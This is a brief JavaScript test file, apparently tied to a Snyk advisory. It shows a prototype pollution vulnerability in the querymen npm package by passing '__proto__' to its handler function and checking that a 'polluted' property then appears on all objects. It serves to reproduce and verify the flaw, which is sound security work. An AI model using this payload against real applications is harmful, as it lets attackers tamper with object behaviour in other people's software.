//https://snyk.io/vuln/SNYK-JS-QUERYMEN-559867
test("prototype pollution in querymen", () => {
    
    var a = require("querymen");
    obj = {}

    expect({}.polluted).toBe(undefined);
    
    a.handler("__proto__","polluted","yes");
    expect({}.polluted).toBe("yes");
  });
  